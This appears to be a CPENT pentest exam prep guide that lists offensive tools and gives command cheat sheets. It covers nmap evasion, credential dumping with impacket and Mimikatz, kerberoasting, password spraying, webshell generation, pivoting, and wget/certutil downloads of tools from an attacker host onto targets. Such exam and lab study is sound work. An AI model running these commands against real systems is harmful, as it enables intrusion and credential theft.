# 02 - TOOLS & SETUP

> Everything here should be installed and verified working **before exam day**. CPENT provides a Parrot Security OS attack VM on the range, but for local practice or if you bring your own attack box, use this checklist. Tools are grouped by phase with the industry-standard tool listed first.

**Zeeshan | GitHub: https://github.com/mzeeshanzafar28 | LinkedIn: https://www.linkedin.com/in/mzeeshanzafar28**

> **Reference:** https://zullunatal.medium.com/prepare-for-lpt-not-cpent-7a88e003e2a7

---

## Table of Contents

1. [Base System Setup](#1-base-system-setup)
2. [Core Tools (Install First)](#2-core-tools-install-first)
3. [Tools by Phase](#3-tools-by-phase)
   - [OSINT & Reconnaissance](#31-osint--reconnaissance)
   - [Network Scanning & Enumeration](#32-network-scanning--enumeration)
   - [Exploitation Frameworks](#33-exploitation-frameworks)
   - [Post-Exploitation & Privilege Escalation](#34-post-exploitation--privilege-escalation)
   - [Active Directory](#35-active-directory)
   - [Web Application](#36-web-application)
   - [Binary Analysis & Exploitation](#37-binary-analysis--exploitation)
   - [IoT & Firmware](#38-iot--firmware)
   - [OT & SCADA](#39-ot--scada)
   - [Wireless](#310-wireless)
   - [Pivoting & Tunneling](#311-pivoting--tunneling)
4. [Password Attacks & Wordlists](#4-password-attacks--wordlists)
5. [Sniffing & MITM Tools](#5-sniffing--mitm-tools)
6. [Windows Tools to Transfer](#6-windows-tools-to-transfer)
7. [ProxyChains Configuration](#7-proxychains-configuration)
8. [Shell Aliases & Shortcuts](#8-shell-aliases--shortcuts)
9. [Nmap Script Database](#9-nmap-script-database)
10. [Pre-Exam Verification Checklist](#10-pre-exam-verification-checklist)
11. [Local Lab Setup](#11-local-lab-setup)
12. [Candidate Tips](#12-candidate-tips)

---

## 1. Base System Setup

### Recommended OS
- **Primary:** Kali Linux (latest rolling) — most candidates' choice
- **Alternative:** Parrot Security OS (what EC-Council provides on the CPENT range)
- **For IoT:** AttifyOS (highly recommended by multiple candidates — pre-loaded IoT toolset)
- **Hypervisor:** VirtualBox or VMware Workstation/Player

### Initial System Prep

```bash
# Full system update
sudo apt update && sudo apt full-upgrade -y

# Essential build tools and dependencies
sudo apt install -y git python3-pip python3-venv golang-go build-essential \
  libssl-dev libffi-dev libpcap-dev

# Metasploit database initialization
sudo msfdb init

# Create tools directory
mkdir -p ~/tools
echo 'export PATH=$PATH:~/tools' >> ~/.bashrc
```

### Snapshot Strategy
Take a VM snapshot **after** installing and verifying everything. Create a second snapshot before the exam. This lets you roll back if anything breaks mid-exam.

---

## 2. Core Tools (Install First)

These are used across almost every range:

```bash
# === PRE-INSTALLED ON KALI (verify they exist) ===
# nmap, masscan, netcat, socat, wireshark, tcpdump, curl, wget
# smbclient, metasploit-framework, john, hashcat, hydra

# === IMPACKET (non-negotiable for AD) ===
sudo apt install python3-impacket -y
# Latest from source (if needed):
# git clone https://github.com/fortra/impacket.git ~/tools/impacket
# cd ~/tools/impacket && pip3 install .

# === NETEXEC (crackmapexec successor) ===
sudo apt install netexec -y
# Alternative: pipx install netexec

# === BLOODHOUND ===
sudo apt install bloodhound -y
pip3 install bloodhound

# === ADDITIONAL ENUMERATION ===
sudo apt install -y enum4linux-ng nbtscan snmpwalk onesixtyone
sudo apt install -y redis-tools ldap-utils

# === PROXYCHAINS ===
sudo apt install proxychains4 -y

# === SECLISTS & WORDLISTS ===
sudo apt install seclists -y
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 3. Tools by Phase

### 3.1 OSINT & Reconnaissance

| Tool | Purpose | Install |
|------|---------|---------|
| **theHarvester** | Email/subdomain/host harvesting | `sudo apt install theharvester` |
| **dnsrecon** / **dnsenum** | DNS enumeration, zone transfers | `sudo apt install dnsrecon dnsenum` |
| **fierce** | DNS reconnaissance | `sudo apt install fierce` |
| **gobuster** | Directory/DNS/vhost brute force | `sudo apt install gobuster` |
| **ffuf** | Fast web fuzzer | `sudo apt install ffuf` |
| **whatweb** | Web stack fingerprinting | `sudo apt install whatweb` |
| **Sublist3r** | Subdomain enumeration | `git clone https://github.com/aboul3la/Sublist3r ~/tools/Sublist3r` |
| **amass** | Advanced subdomain enumeration | `sudo apt install amass` |
| **subfinder** | Fast passive subdomain discovery | `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| **dnsmap** | Subdomain brute force | `sudo apt install dnsmap` |
| **urlcrazy** | Typosquat / similar domain discovery | `sudo apt install urlcrazy` |
| **whois** | Registrant / IP block info | Pre-installed |
| **Shodan CLI** | Internet-connected device search | `pip install shodan` then `shodan init API_KEY` |
| **Maltego** | OSINT graph/link analysis | Pre-installed (needs free CE account) |
| **Metagoofil** | Document metadata harvesting | `git clone https://github.com/laramies/metagoofil ~/tools/metagoofil` |
| **FOCA** | Metadata harvesting (Windows) | Download from ElevenPaths (run in Windows VM) |

**Quick OSINT Commands:**

```bash
# Subdomain discovery
theHarvester -d DOMAIN -b all -f output.html
sublist3r -d DOMAIN
amass enum -d DOMAIN
gobuster dns -d DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS enumeration
dnsrecon -d DOMAIN -a
dnsenum DOMAIN
dig AXFR @DNS_SERVER DOMAIN

# Email harvesting
theHarvester -d DOMAIN -b google,linkedin

# Document metadata
python3 ~/tools/metagoofil/metagoofil.py -d DOMAIN -t doc,pdf,docx -l 100 -n 10 -o results -f results.html
```

### 3.2 Network Scanning & Enumeration

| Tool | Purpose | Install |
|------|---------|---------|
| **Nmap** | Primary port/service/OS scanner — **always your first tool** | Pre-installed |
| **masscan** | Ultra-fast full-port-range scanning | Pre-installed |
| **Wireshark / tshark** | Packet capture and protocol analysis | Pre-installed |
| **tcpdump** | Command-line packet capture | Pre-installed |
| **netdiscover** | ARP-based live host discovery | `sudo apt install netdiscover` |
| **arp-scan** | Alternative ARP scanner | `sudo apt install arp-scan` |
| **hping3** | Custom packet crafting, firewall testing | `sudo apt install hping3` |
| **p0f** | Passive OS fingerprinting | `sudo apt install p0f` |
| **Dmitry** | All-in-one passive/active info gathering | `sudo apt install dmitry` |
| **nbtscan** | NetBIOS name scanning | `sudo apt install nbtscan` |
| **enum4linux-ng** | SMB/Samba/AD enumeration | `sudo apt install enum4linux-ng` |
| **rpcinfo** | RPC service enumeration | Part of `rpcbind` (pre-installed) |
| **showmount** | NFS export enumeration | Part of `nfs-common` (pre-installed) |
| **responder** | LLMNR/NBT-NS/mDNS poisoning | `sudo apt install responder` |

**Nmap Quick Reference:**

```bash
# Host discovery
nmap -sn TARGET_RANGE                  # Ping sweep
nmap -PR -sn TARGET_RANGE              # ARP scan (same subnet only)
nmap -Pn TARGET_IP                     # No ping, scan anyway

# Port scanning
nmap -sS TARGET_IP                     # SYN stealth scan (default, needs root)
nmap -sT TARGET_IP                     # TCP connect scan
nmap -sU TARGET_IP                     # UDP scan
nmap -p- TARGET_IP                     # All 65535 ports
nmap -p 80,443,445,3389 TARGET_IP      # Specific ports
nmap --top-ports 100 TARGET_IP         # Top 100 ports

# Service & OS detection
nmap -sV TARGET_IP                     # Service/version detection
nmap -O TARGET_IP                      # OS detection
nmap -A TARGET_IP                      # Aggressive: OS + version + scripts + traceroute

# NSE scripts
nmap --script SCRIPT_NAME TARGET_IP
nmap -sC TARGET_IP                     # Default safe scripts (= --script=default)
nmap --script vuln TARGET_IP           # Vulnerability scanning scripts
nmap --script "smb*" TARGET_IP         # All SMB scripts

# Evasion & timing
nmap -T4 TARGET_IP                     # Aggressive timing (0=paranoid → 5=insane)
nmap --spoof-mac 0 TARGET_IP           # Random MAC
nmap -D RND:10 TARGET_IP               # Decoy scan
nmap -sI ZOMBIE_IP TARGET_IP           # Idle/zombie scan
nmap --source-port 53 TARGET_IP        # Spoof source port (firewall bypass)

# Output
nmap -oN output.txt TARGET_IP          # Normal output
nmap -oX output.xml TARGET_IP          # XML output (for importing into other tools)
nmap -oA scan_results TARGET_IP        # All formats (-oN, -oX, -oG)
nmap -iL targets.txt                   # Scan from file
```

### 3.3 Exploitation Frameworks

| Tool | Purpose | Install |
|------|---------|---------|
| **Metasploit Framework** | Primary exploitation/post-exploitation framework | Pre-installed (`sudo msfdb init` to set up DB) |
| **searchsploit** (Exploit-DB) | Offline exploit database search | `sudo apt install exploitdb` |
| **evil-winrm** | WinRM shell access with valid creds | `sudo apt install evil-winrm` |
| **Veil** | AV-evading payload generation | `git clone https://github.com/Veil-Framework/Veil ~/tools/Veil` |
| **PayloadsAllTheThings** | Curated payload and bypass list | `git clone https://github.com/swisskyrepo/PayloadsAllTheThings ~/tools/PayloadsAllTheThings` |

```bash
# Metasploit quick start
msfconsole -q
msf6 > search SMB
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options

# Searchsploit
searchsploit wordpress
searchsploit -m 42031                    # Mirror specific exploit to current dir
searchsploit -t "Windows 7"              # Title search

# Evil-WinRM examples
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH
```

### 3.4 Post-Exploitation & Privilege Escalation

| Tool | Purpose | Install |
|------|---------|---------|
| **LinPEAS / WinPEAS** | Automated privilege escalation enumeration | Download from [carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **linenum.sh** | Linux enum script | `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` |
| **pspy** | Unprivileged Linux process snooping | Download from GitHub |
| **PowerUp.ps1** | Windows privilege escalation checks | Part of PowerSploit |
| **SharpUp** | C# Windows privesc checks | Download from GitHub |
| **Seatbelt** | C# Windows enumeration | Download from GitHub |
| **Linux Exploit Suggester** | Kernel exploit suggestion | `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh` |
| **GTFOBins** | Living off the land reference | https://gtfobins.github.io |
| **LOLBAS** | Windows living off the land | https://lolbas-project.github.io |

```bash
# Transfer PEAS to target
# On attacker:
python3 -m http.server 80
# On target:
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Linux quick wins
find / -perm -4000 -type f 2>/dev/null      # SUID
sudo -l                                       # Sudo permissions
getcap -r / 2>/dev/null                       # Capabilities
cat /etc/crontab && ls -la /etc/cron.*       # Cron jobs

# Windows quick wins
whoami /priv
systeminfo
net localgroup administrators
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 3.5 Active Directory

| Tool | Purpose | Install |
|------|---------|---------|
| **Impacket** suite | Kerberos/SMB/AD attack toolkit | `sudo apt install python3-impacket` |
| **NetExec / crackmapexec** | Swiss-army-knife AD/SMB enumeration | `sudo apt install netexec` |
| **BloodHound + SharpHound** | AD attack-path graphing | `sudo apt install bloodhound` |
| **Rubeus** | Kerberos ticket abuse (Windows .NET) | Download compiled binary |
| **Mimikatz** | Credential dumping (Windows-native) | Deploy via meterpreter/manual upload |
| **ldapdomaindump** | LDAP domain dumper | `pip3 install ldapdomaindump` |
| **kerbrute** | Kerberos user enumeration and password spray | Download from GitHub |
| **certipy-ad** | AD CS (Certificate Services) attacks | `pip3 install certipy-ad` |
| **gpp-decrypt** | Decrypt Group Policy Preferences `cpassword` | Pre-installed (`gpp-decrypt`) |
| **PowerView.ps1** | PowerShell AD enumeration | Part of PowerSploit |

```bash
# Impacket essentials
impacket-psexec DOMAIN/USERNAME:PASSWORD@TARGET_IP
impacket-secretsdump DOMAIN/USERNAME:PASSWORD@DC_IP
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -request
impacket-wmiexec DOMAIN/USERNAME:PASSWORD@TARGET_IP
impacket-smbexec DOMAIN/USERNAME:PASSWORD@TARGET_IP
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN USERNAME

# NetExec / CME
netexec smb TARGET_RANGE -u USERNAME -p PASSWORD --shares
netexec smb TARGET_RANGE -u USERNAME -p PASSWORD --pass-pol
netexec smb TARGET_RANGE -u USERNAME -p PASSWORD -M lsassy
netexec smb TARGET_RANGE -u '' -p '' --shares        # Anonymous
netexec smb TARGET_RANGE -u users.txt -p 'Spring2024!' --continue-on-success
netexec winrm TARGET_IP -u USERNAME -p PASSWORD -x 'whoami'

# BloodHound collection
bloodhound-python -d DOMAIN -u USERNAME -p PASSWORD -ns DC_IP -c All
# Or on Windows: SharpHound.exe -c All

# Rubeus (on Windows target)
Rubeus.exe kerberoast /domain:DOMAIN /outfile:hashes.txt
Rubeus.exe asreproast /domain:DOMAIN

# GPP password decryption
gpp-decrypt CPASSWORD_VALUE
```

### 3.6 Web Application

| Tool | Purpose | Install |
|------|---------|---------|
| **Burp Suite** (Community/Pro) | Primary web proxy/intercept/intruder | Download from [PortSwigger](https://portswigger.net) |
| **OWASP ZAP** | Free alternative to Burp | `sudo apt install zaproxy` |
| **sqlmap** | Automated SQL injection | `sudo apt install sqlmap` |
| **whatweb** | Web stack fingerprinting | `sudo apt install whatweb` |
| **wpscan** | WordPress scanner | `sudo apt install wpscan` |
| **ffuf** | Fast web fuzzer (dirs, params, vhosts) | `sudo apt install ffuf` |
| **gobuster** | Directory brute force | `sudo apt install gobuster` |
| **feroxbuster** | Recursive forced browsing | `sudo apt install feroxbuster` |
| **Nikto** | Web server vuln scanner | `sudo apt install nikto` |
| **Weevely** | PHP webshell generator/manager | `sudo apt install weevely` |
| **dirb** | Directory brute force (legacy) | `sudo apt install dirb` |
| **nuclei** | Template-based vulnerability scanner | `sudo apt install nuclei` |
| **commix** | Command injection exploiter | `sudo apt install commix` |
| **Nessus / OpenVAS** | Full vulnerability scanners | `sudo apt install openvas` (GVM for free option) |

```bash
# Web fingerprinting
whatweb TARGET_URL

# Directory fuzzing
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# WordPress scanning
wpscan --url http://TARGET_IP --enumerate ap,at,cb,dbe,u

# SQL Injection
sqlmap -u "http://TARGET_IP/page.php?id=1" --dbs
sqlmap -u "http://TARGET_IP/page.php?id=1" -D DATABASE --tables
sqlmap -u "http://TARGET_IP/page.php?id=1" -D DATABASE -T TABLE --dump
sqlmap -r request.txt -p vulnerable_param                    # From Burp request

# Nikto quick scan
nikto -h http://TARGET_IP -p 80,443,8080,8443

# Weevely PHP webshell
weevely generate PASSWORD /tmp/shell.php                     # Generate
weevely http://TARGET_IP/uploads/shell.php PASSWORD          # Connect
```

### 3.7 Binary Analysis & Exploitation

| Tool | Purpose | Install |
|------|---------|---------|
| **gdb** + GEF/PEDA/pwndbg | Debugger with exploit-dev plugins | `sudo apt install gdb`; GEF: `bash -c "$(curl -fsSL https://gef.blah.cat/sh)"` |
| **radare2 / Cutter** | Reverse engineering framework | `sudo apt install radare2` |
| **Ghidra** | NSA's free full RE suite | Download from [ghidra-sre.org](https://ghidra-sre.org) |
| **objdump** | Disassembly | Part of `binutils` (pre-installed) |
| **strings / file / xxd** | Quick static triage | Pre-installed |
| **rabin2** | Binary info extraction | Bundled with radare2 |
| **edb** (Evan's Debugger) | GUI debugger alternative | `sudo apt install edb-debugger` |
| **ROPgadget / ropper** | ROP chain gadget finder | `pip install ROPgadget ropper` |
| **pwntools** | Python exploit-dev library | `sudo apt install python3-pwntools` |
| **NASM** | Assembler for shellcode writing | `sudo apt install nasm` |
| **checksec** | Binary protections checker | `pip install checksec.py` |
| **mona.py** | Immunity Debugger plugin (Windows) | Download for Windows VM |
| **msf-pattern_create / msf-pattern_offset** | Find EIP offset | Bundled with Metasploit |

```bash
# Quick binary triage
file BINARY
strings BINARY | less
rabin2 -I BINARY           # Binary info
checksec BINARY             # Protections (NX, ASLR, canary, PIE)
objdump -d -M intel BINARY  # Disassembly

# Pattern create / offset (for buffer overflow EIP control)
msf-pattern_create -l LENGTH
msf-pattern_offset -q EIP_VALUE

# gdb workflow
gdb BINARY
gdb-peda$ disassemble main
gdb-peda$ pattern create 500
gdb-peda$ run
# ... crash with pattern in EIP
gdb-peda$ pattern offset EIP_VALUE    # Get crash offset

# ROP gadget search
ROPgadget --binary BINARY > gadgets.txt
grep ": pop rdi" gadgets.txt
```

### 3.8 IoT & Firmware

| Tool | Purpose | Install |
|------|---------|---------|
| **binwalk** | Firmware extraction/analysis | `sudo apt install binwalk` |
| **QEMU** | Firmware/architecture emulation | `sudo apt install qemu-system qemu-user-static` |
| **Firmware Analysis Toolkit (FAT)** | Automates binwalk + QEMU | `git clone https://github.com/attify/firmware-analysis-toolkit ~/tools/FAT` |
| **Firmadyne** | Automated firmware emulation | `git clone https://github.com/firmadyne/firmadyne ~/tools/firmadyne` |
| **hexdump / xxd** | Manual byte-level firmware inspection | Pre-installed |
| **squashfs-tools** | SquashFS filesystem tools | `sudo apt install squashfs-tools` |
| **sasquatch** | Non-standard SquashFS support | Build from source |

**Strong recommendation:** Use **AttifyOS** (pre-built IoT pentesting VM) for the IoT range. It pre-loads the entire toolset and emulators. Available from attify.com.

```bash
# Firmware analysis workflow
# Step 1: Identify the file
file FIRMWARE.bin
hexdump -C FIRMWARE.bin | head

# Step 2: Extract with binwalk
sudo binwalk -e FIRMWARE.bin
ls FIRMWARE.bin.extracted/

# Step 3: Browse extracted filesystem
cd FIRMWARE.bin.extracted/
find . -name "*.conf" -o -name "*passwd*" -o -name "*shadow*" -o -name "*.key"

# Step 4: Search for hardcoded credentials
strings FIRMWARE.bin | grep -iE 'password|passwd|secret|admin|root|key|token'

# Step 5: Check firmware metadata
binwalk FIRMWARE.bin
```

### 3.9 OT & SCADA

| Tool | Purpose | Install |
|------|---------|---------|
| Nmap (SCADA NSE scripts) | Safe-mode ICS discovery | Scripts at `/usr/share/nmap/scripts/` |
| Wireshark (Modbus/DNP3/BACnet) | Protocol-level ICS traffic analysis | Pre-installed |
| Metasploit SCADA modules | `modbusdetect`, `modbus_findunitid` | Bundled in Metasploit |
| **QModMaster** | Modbus master emulator (lab) | `sudo apt install qmodmaster` |
| **ModbusPal** | Modbus slave simulator (lab) | Download Java JAR |
| **GrassMarlin** | Passive ICS network mapping | Download from CISA/NSA archive |

```bash
# Safe SCADA scanning (availability is priority — DO NOT use -A or -O)
nmap -n -PR -sn TARGET_RANGE                    # ARP sweep
nmap -n -sn TARGET_RANGE                        # Ping sweep only
nmap -n -sT --scan-delay 0.1 TARGET_IP          # Slow connect scan
nmap --top-ports 100 -T2 TARGET_IP              # Conservative top ports

# Find Modbus devices (port 502)
sudo nmap -sS TARGET_RANGE/24 -p 502 --open

# Modbus discovery
sudo nmap --script=modbus-discover.nse -p 502 TARGET_IP

# Metasploit Modbus
msf6 > search modbus
msf6 > use auxiliary/scanner/scada/modbus_findunitid
msf6 > use auxiliary/scanner/scada/modbusdetect

# Wireshark Modbus filter
modbus
tcp.port == 502
frame contains "write"
!(modbus.func_code == 3)
```

### 3.10 Wireless

| Tool | Purpose | Install |
|------|---------|---------|
| **Aircrack-ng suite** | Core wireless capture/crack toolkit | `sudo apt install aircrack-ng` |
| **Wifite** | Automated wireless attack | `sudo apt install wifite` |
| **Airgeddon** | Menu-driven wireless framework | `git clone https://github.com/v1s1t0r1sh3r3/airgeddon ~/tools/airgeddon` |
| **Fluxion** | Evil-twin/captive-portal attacks | `git clone https://github.com/FluxionNetwork/fluxion ~/tools/fluxion` |
| **bettercap** | Modern MITM framework | `sudo apt install bettercap` |

**Hardware requirement:** USB wireless adapter supporting **monitor mode + packet injection** (e.g., Alfa AWUS036ACH). Built-in laptop cards usually don't support injection.

### 3.11 Pivoting & Tunneling

| Tool | Purpose | Install |
|------|---------|---------|
| Metasploit `autoroute` + `socks_proxy` | In-framework pivoting through meterpreter | Bundled in Metasploit |
| **ProxyChains** | Route tools through SOCKS pivot | `sudo apt install proxychains4` |
| **Chisel** | Fast TCP/UDP tunneling over HTTP | Download from [GitHub](https://github.com/jpillora/chisel) |
| **Ligolo-ng** | Modern tunneling/pivoting | Download from [GitHub](https://github.com/nicocha30/ligolo-ng) |
| **SSH** (`-D`, `-L`, `-R`) | Built-in port forwarding | Pre-installed |
| **socat** | Powerful port forwarding and relays | Pre-installed |
| **plink.exe** | Windows SSH client for port forwarding | Part of PuTTY suite |

```bash
# Chisel setup
# On attacker (server):
./chisel server -p 8000 --reverse

# On target (client):
./chisel client YOUR_IP:8000 R:1080:socks

# Ligolo-ng setup (recommended by high scorers)
# On attacker:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert

# On target:
./ligolo-agent -connect YOUR_IP:11601 -ignore-cert

# SSH dynamic port forwarding (quick pivot)
ssh -D 1080 -f -C -q -N USERNAME@PIVOT_IP
# Then use: proxychains nmap -sT -Pn INTERNAL_TARGET

# SSH local port forward
ssh -L LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT USERNAME@PIVOT_IP

# SSH remote port forward (from target back to you)
ssh -R REMOTE_PORT:localhost:LOCAL_PORT USERNAME@YOUR_IP

# Metasploit pivoting through meterpreter
# In meterpreter session:
meterpreter > run post/multi/manage/autoroute SUBNET=172.16.0.0/24
meterpreter > run autoroute -p                    # Confirm routes
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run
# Then: proxychains nmap -sT -Pn 172.16.0.10
```

---

## 4. Password Attacks & Wordlists

### Wordlist Setup

```bash
# Rockyou (standard baseline — must be unzipped)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (much larger curated collection)
sudo apt install seclists -y
ls /usr/share/seclists/Passwords/

# Custom wordlist from target website
cewl TARGET_URL -w custom_words.txt -d 3 -m 5

# Targeted custom list from a password policy hint
# (e.g., if you know the password format: CompanyName + Year)
echo "Spring2024" >> custom.txt
echo "Summer2024" >> custom.txt
echo "Fall2024!" >> custom.txt
```

### Password Cracking Tools

| Tool | Purpose | Install |
|------|---------|---------|
| **hashcat** | Primary GPU-accelerated hash cracking | Pre-installed |
| **John the Ripper** | Strong format auto-detection | Pre-installed |
| **hydra** | Online brute-force across protocols | Pre-installed |
| **hash-identifier** | Identify hash type | Pre-installed |
| **name-that-hash** | Hash identification | `pip install name-that-hash` |

```bash
# Hashcat mode reference (memorize these)
# 0     = MD5
# 1000  = NTLM
# 13100 = Kerberos 5 TGS-REP (Kerberoasting)
# 18200 = Kerberos 5 AS-REP (AS-REP roasting)
# 5600  = NTLMv2 (Net-NTLMv2)
# 1800  = SHA-512 crypt ($6$) — Linux /etc/shadow
# 3200  = bcrypt

# Common hashcat commands
hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt

# Hydra examples
hydra -L users.txt -P passwords.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ftp://TARGET_IP
hydra -l admin -P passwords.txt TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -p 'Spring2024!' smb://TARGET_IP          # Password spray

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

---

## 5. Sniffing & MITM Tools

| Tool | Purpose | Install |
|------|---------|---------|
| **bettercap** | Modern MITM framework (ARP/DNS spoofing, sniffing) | `sudo apt install bettercap` |
| **Ettercap** | Legacy MITM suite | `sudo apt install ettercap-graphical` |
| **Responder** | LLMNR/NBT-NS/mDNS poisoning for hash capture | `sudo apt install responder` |
| **Wireshark** | Primary capture analysis | Pre-installed |
| **tcpdump** | CLI packet capture | Pre-installed |

```bash
# Responder (capture NTLM hashes from Windows network)
sudo responder -I eth0 -wrf

# tcpdump filters
sudo tcpdump -i eth0 host TARGET_IP
sudo tcpdump -i eth0 port 445
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -r capture.pcap | grep -i password

# Wireshark display filters
ip.addr == TARGET_IP
tcp.port == 445
http
http.request.method == POST
dns
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

---

## 6. Windows Tools to Transfer

Keep these ready in `~/tools/windows/` for transfer during the exam:

```
~/tools/windows/
├── mimikatz.exe / Invoke-Mimikatz.ps1
├── Rubeus.exe
├── SharpHound.exe / SharpHound.ps1
├── nc.exe (netcat for Windows)
├── chisel.exe (Windows agent)
├── ligolo-agent.exe
├── WinPEAS.exe / WinPEAS.bat
├── PowerView.ps1
├── PowerUp.ps1
├── PrintSpoofer.exe / GodPotato.exe
├── plink.exe (PuTTY SSH)
├── PsExec.exe (Sysinternals)
├── accesschk.exe (Sysinternals)
└── Invoke-Kerberoast.ps1
```

**Transfer methods:**
```bash
# Python HTTP server (attacker)
python3 -m http.server 80

# PowerShell download (target)
IWR -Uri http://YOUR_IP/tool.exe -OutFile C:\Windows\Temp\tool.exe
certutil -urlcache -f http://YOUR_IP/tool.exe C:\Windows\Temp\tool.exe

# SMB share (attacker)
impacket-smbserver share ~/tools/windows/ -smb2support
# On target: copy \\YOUR_IP\share\tool.exe C:\Windows\Temp\
```

---

## 7. ProxyChains Configuration

Edit `/etc/proxychains4.conf`:

```bash
sudo nano /etc/proxychains4.conf
```

**Recommended settings:**
```
# Default settings should have:
strict_chain                           # Change to dynamic_chain for multi-proxy
# dynamic_chain                        # Uncomment for double pivots

# Quiet mode (remove the random_chain noise):
# Uncomment: quiet_mode

[ProxyList]
# SOCKS5 proxy from Metasploit socks_proxy or Chisel/Ligolo-ng
socks5 127.0.0.1 1080
```

For **double pivots**, uncomment `dynamic_chain` and add the second SOCKS proxy:
```
dynamic_chain

[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

**Verification:**
```bash
# Test connectivity through pivot
proxychains curl -s https://ifconfig.me
proxychains nmap -sT -Pn -p 445 INTERNAL_TARGET_IP

# CRITICAL: Always use -sT -Pn with nmap when proxied
# SYN scans and host discovery do NOT work reliably through SOCKS
```

---

## 8. Shell Aliases & Shortcuts

Add to `~/.bashrc` or `~/.zshrc`:

```bash
# Quick scanning aliases
alias sn='sudo nmap -sS -Pn'
alias snv='sudo nmap -sS -sV -Pn'
alias sna='sudo nmap -sS -sV -sC -O -Pn'
alias snall='sudo nmap -sS -sV -sC -O -Pn -p-'
alias nmapudp='sudo nmap -sU --top-ports 100'

# Quick listeners
alias rl='rlwrap nc -lvnp 4444'
alias rl2='rlwrap nc -lvnp 5555'

# HTTP server
alias serve='python3 -m http.server 80'
alias serve2='python3 -m http.server 8080'

# Quick directory for engagement
alias eng='mkdir -p engagement/{scope,notes,scans,screenshots,loot,credentials,pcaps,exploits,shells,report} && cd engagement'

# Metasploit quick start
alias msf='msfconsole -q'

# ProxyChains shortcuts
alias pcnmap='proxychains nmap -sT -Pn'
alias pccme='proxychains crackmapexec smb'
alias pcssh='proxychains ssh'

# grep helpers
alias gpass='grep -iE "password|passwd|pwd|secret|token|key"'
alias gadmin='grep -iE "admin|root|superuser"'
```

---

## 9. Nmap Script Database

```bash
# All scripts location
ls /usr/share/nmap/scripts/

# Update scripts
sudo nmap --script-updatedb

# Useful script categories
ls /usr/share/nmap/scripts/smb-*
ls /usr/share/nmap/scripts/http-*
ls /usr/share/nmap/scripts/dns-*
ls /usr/share/nmap/scripts/*modbus*
ls /usr/share/nmap/scripts/*vuln*
ls /usr/share/nmap/scripts/ldap-*
ls /usr/share/nmap/scripts/rdp-*
```

---

## 10. Pre-Exam Verification Checklist

Run every one of these before exam day. Fix anything that fails.

```bash
# System
uname -a && cat /etc/os-release
sudo apt update && sudo apt full-upgrade -y

# Core tools
nmap --version
masscan --version
nc -h 2>&1 | head -2
socat -V
proxychains4 -h 2>&1 | head -1

# Metasploit
msfconsole -q -x "version; exit"
sudo msfdb status

# Impacket
impacket-smbclient --help | head -1
impacket-psexec --help | head -1
impacket-secretsdump --help | head -1
impacket-GetUserSPNs --help | head -1

# AD tools
netexec --version
bloodhound --version
bloodhound-python --help | head -1
evil-winrm --version

# Web tools
sqlmap --version
wpscan --version
gobuster --version
ffuf --version
whatweb --version

# Binary tools
gdb --version
radare2 --version
python3 -c "import pwntools; print(pwntools.__version__)" 2>/dev/null || echo "pwntools not found"

# IoT tools
binwalk --help | head -1

# Wordlists
ls -lh /usr/share/wordlists/rockyou.txt
ls /usr/share/seclists/Passwords/ | head -5

# Pivoting
chisel --help 2>&1 | head -1
ssh -V

# Password tools
hashcat --version
john --version
hydra --help 2>&1 | head -1

# ProxyChains test (for pivoting lab)
# After setting up a SOCKS proxy in a practice lab:
# proxychains curl -s https://ifconfig.me
```

---

## 11. Local Lab Setup

### Quick Test Lab (15 minutes)

```bash
# 1. Download Metasploitable 2
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# 2. Import into VirtualBox/VMware
# Set network to "Host-Only" adapter

# 3. Boot Metasploitable (default creds: msfadmin/msfadmin)

# 4. From Kali (on same host-only network):
sudo nmap -sS TARGET_IP -p- -oA metasploitable_scan
```

### Active Directory Lab

For serious AD practice:
- **GOAD** (Game of Active Directory): `https://github.com/Orange-Cyberdefense/GOAD`
- **Detection Lab:** `https://github.com/clong/DetectionLab`
- **BadBlood:** `https://github.com/davidprowe/BadBlood`

### IoT Lab
- Use **AttifyOS** VM with QEMU for firmware emulation
- Practice with known vulnerable firmware images (D-Link, Netgear, TP-Link)

---

## 12. Candidate Tips

Based on repeated themes from high-scoring candidate experiences:

